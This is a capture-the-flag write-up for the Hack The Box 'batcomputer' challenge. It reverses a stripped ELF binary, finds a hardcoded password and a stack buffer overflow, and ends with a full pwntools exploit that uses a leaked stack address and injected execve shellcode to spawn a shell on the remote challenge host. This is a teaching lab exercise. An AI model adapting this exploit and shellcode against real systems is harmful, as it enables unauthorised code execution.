`File` command on the binary shows that it is stripped, meaning there are no debug symbols present. A stripped binary makes it more difficult to reverse engineer and the main function will be harder to find.

```assembly
# file batcomputer | tr "," "\n" 
batcomputer: ELF 64-bit LSB pie executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22
 for GNU/Linux 3.2.0
 stripped
```

```assembly
# checksec batcomputer           
[*] '/root/Downloads/hackthebox/challenge/batcomputer/batcomputer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
Because the binary is stripped we cant simply go to the main function. A simple work around is to look at the strings to see if we have encountered them before. In Ghidra, the strings window can be displayed by going to Window > Defined Strings. The screenshot above shows the string “Welcome to your Bat Computer.” selected. Following this string we land on what looks like our main function, FUN_001011ec (this may be different on your computer)




![image](https://user-images.githubusercontent.com/63084488/140466459-32617dda-1208-423c-aa91-4c77843b1d31.png)


In order to make analysis easier, the variables have been renamed to better reflect their purpose. One of these variables is user_choice whose value determines which message/prompt to show the user. On line 18 user_choice is compared with integer 1, if equal, the memory address of the nav_command buffer is printed using printf. If instead user_choice is 2, a password is requested and stored into user_pass using scanf. Line 24 clearly shows the password being compared to the string b4tp@$$w0rd!. If the passwords do not match the program terminates with exit(). If the passwords do match, however, the user is asked to provide their commands which are then stored within the nav_commands buffer, the same buffer whose address was printed in option 1. The string “Roger that!” is printed and the function loops back to the beginning. If user_choice are neither 1 nor 2, the binary prints a “Too bad” message and returns 0, finishing execution.

There is buffer overflow vulnerability within the read call on line 32. 0x89 (137) bytes are read from standard input into a buffer that is only allocated 76 bytes. This gives us enough space to overwrite the return address. We have to figure out the number of bytes between the start of our navigation commands input and the return address. We can do this using GDB.



exploit
```python
#!/usr/bin/python3

from pwn import *

def main():
    context.log_level='DEBUG'
    context.update(arch='amd64', os='linux')
    p = remote('docker.hackthebox.eu',31132)
    log.info("lets solve")

    # leak address of my buffer
    p.recvuntil('>')
    p.sendline('1')

    leak_address = p.recvline().split()[-1]
    leak_address = int(leak_address,16)
    log.success(f'leak_address: {hex(leak_address)}')

    # send evil payload
    # payload + eip + shellcode

    padding = b'A' * 84

    shellcode  = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    shellcode += b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    shellcode += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    shellcode += b"\x3b\x0f\x05"

    buffer = flat (
            padding,
            p64(leak_address + 84+8),
            shellcode
            )

    p.recvuntil('>')
    p.send('2')
    p.recv()
    p.sendline('b4tp@$$w0rd!')
    p.recvline()
    p.send(buffer)

    # trigger buffer overflow
    p.recvline()
    p.sendline('3')

    p.interactive()

if __name__ == '__main__':
    main()
```
